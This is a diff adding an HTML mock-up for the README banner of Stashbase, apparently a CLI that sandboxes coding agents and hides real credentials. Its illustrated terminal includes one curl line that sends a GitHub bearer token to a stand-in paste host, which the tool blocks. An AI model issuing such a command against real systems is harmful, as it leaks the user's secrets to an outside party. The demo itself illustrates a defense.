@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<!-- Source for readme-hero.png. Regenerate (2x, 2560x1280): chrome --headless=new --force-device-scale-factor=2 --window-size=1280,640 --virtual-time-budget=6000 --screenshot=readme-hero.png readme-hero.html -->
+<html>
+<head>
+<meta charset="utf-8">
+<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
+<link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: hsl(0 0% .5%);
+    --border: hsl(0 0% 14.9%);
+    --fg: hsl(0 0% 90%);
+    --muted: hsl(0 0% 63.9%);
+    --accent: #D97757;
+    --teal: #0bd8b6;
+    --orange: #ffb86c;
+    --red: #f68084;
+    --comment: #6272a4;
+    --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { width: 1280px; height: 640px; background: var(--bg); overflow: hidden; }
+  body { position: relative; font-family: Satoshi, system-ui, sans-serif; color: var(--fg); -webkit-font-smoothing: antialiased; }
+
+  .grid {
+    position: absolute; inset: -30% 0; transform: skewY(12deg);
+    background-image:
+      linear-gradient(to right, rgb(156 163 175 / .12) 1px, transparent 1px),
+      linear-gradient(to bottom, rgb(156 163 175 / .12) 1px, transparent 1px);
+    background-size: 40px 40px;
+    -webkit-mask-image: radial-gradient(640px circle at 50% 45%, white, transparent);
+  }
+
+  .brand { position: absolute; top: 40px; left: 48px; display: flex; align-items: center; gap: 8px;
+    font-weight: 700; letter-spacing: .05em; color: rgb(241 241 241 / .9); font-size: 17px; }
+  .brand svg { width: 18px; height: 18px; opacity: .9; }
+  .tag { position: absolute; top: 40px; right: 48px; font-family: var(--mono); font-size: 12px;
+    color: var(--muted); border: 1px solid var(--border); border-radius: 999px; padding: 4px 12px; }
+
+  .hero { position: absolute; top: 84px; left: 0; right: 0; text-align: center; }
+  h1 { font-family: "Instrument Serif", Georgia, serif; font-weight: 400; font-size: 76px;
+    line-height: 1.03; letter-spacing: .01em; opacity: .85; }
+  h1 span { color: var(--accent); }
+  .sub { margin: 18px auto 0; max-width: 620px; font-size: 18px; line-height: 1.6; color: var(--muted); letter-spacing: .01em; }
+
+  .stage { position: absolute; top: 366px; left: 50%; transform: translateX(-50%);
+    display: flex; gap: 16px; width: 1088px;
+    -webkit-mask-image: linear-gradient(to bottom, white 78%, transparent 100%); }
+  .card { border: 1px solid var(--border); border-radius: 14px; overflow: hidden;
+    background: linear-gradient(to top left, rgb(23 23 23 / .1), rgb(23 23 23 / .15), rgb(38 38 38 / .25)); }
+  .card header { display: flex; align-items: center; gap: 8px; padding: 12px 18px;
+    border-bottom: 1px solid var(--border); font-size: 13px; color: var(--muted); }
+  .card header svg { width: 14px; height: 14px; }
+  .term { flex: 1 1 auto; }
+  .audit { flex: 0 0 340px; }
+  pre { font-family: var(--mono); font-size: 13.5px; line-height: 1.75; padding: 16px 20px; color: #f8f8f2; }
+  .c { color: var(--comment); } .o { color: var(--orange); } .t { color: var(--teal); } .r { color: var(--red); } .m { color: var(--muted); }
+
+  .row { display: flex; align-items: center; justify-content: space-between; gap: 12px;
+    padding: 11px 18px; border-bottom: 1px solid rgb(38 38 38 / .6); font-family: var(--mono); font-size: 12.5px; }
+  .row .host { color: #f8f8f2; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .row .host i { font-style: normal; color: var(--muted); margin-right: 8px; }
+  .pill { font-size: 11px; padding: 2px 8px; border-radius: 999px; border: 1px solid; flex: none; }
+  .pill.t { border-color: rgb(11 216 182 / .35); }
+  .pill.r { border-color: rgb(246 128 132 / .35); }
+  .pill.m { border-color: var(--border); }
+</style>
+</head>
+<body>
+  <div class="grid"></div>
+
+  <div class="brand">
+    <svg viewBox="8 8 84 84"><path fill="#FFFFFF" d="M38.461 80.461 L50.000 92.000 L92.000 50.000 L80.461 38.461 Z M8.000 50.000 L34.925 76.925 L76.925 34.925 L50.000 8.000 Z"/></svg>
+    Stashbase
+  </div>
+  <div class="tag">open-source CLI</div>
+
+  <div class="hero">
+    <h1>Access control for<br><span>coding agents</span></h1>
+    <p class="sub">Run coding agents in a sandbox with access rules for files, APIs, and tools. Let them use credentials without seeing the real values.</p>
+  </div>
+
+  <div class="stage">
+    <div class="card term">
+      <header>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19h8"/><path d="m4 17 6-6-6-6"/></svg>
+        agent session · sandboxed
+      </header>
+<pre><span class="m">$</span> stashbase agent run --profile coding -- claude
+<span class="c">  sandbox on · secrets as placeholders · egress via Agent Proxy</span>
+<span class="m">$</span> echo $GH_TOKEN
+<span class="o">  **STASHBASE_GH_TOKEN**</span>
+<span class="m">$</span> curl -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user
+<span class="t">  200</span> <span class="c">placeholder exchanged for api.github.com</span>
+<span class="m">$</span> curl -H "Authorization: Bearer $GH_TOKEN" https://paste.example.net
+<span class="r">  403</span> <span class="c">host not allowed for GH_TOKEN</span></pre>
+    </div>
+
+    <div class="card audit">
+      <header>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 12h-5"/><path d="M15 8h-5"/><path d="M19 17V5a2 2 0 0 0-2-2H4"/><path d="M8 21h12a2 2 0 0 0 2-2v-1a1 1 0 0 0-1-1H11a1 1 0 0 0-1 1v1a2 2 0 1 1-4 0V5a2 2 0 1 0-4 0v2a1 1 0 0 0 1 1h3"/></svg>
+        Audit log <span style="margin-left:auto;font-family:var(--mono);font-size:12px">1 injected · 1 blocked</span>
+      </header>
+      <div class="row"><span class="host"><i>GET</i>api.github.com/user</span><span class="pill t t">injected</span></div>
+      <div class="row"><span class="host"><i>GET</i>paste.example.net</span><span class="pill r r">blocked</span></div>
+      <div class="row"><span class="host"><i>GET</i>registry.npmjs.org</span><span class="pill m m">allowed</span></div>
+      <div class="row"><span class="host"><i>GET</i>api.anthropic.com</span><span class="pill m m">allowed</span></div>
+    </div>
+  </div>
+</body>
+</html>
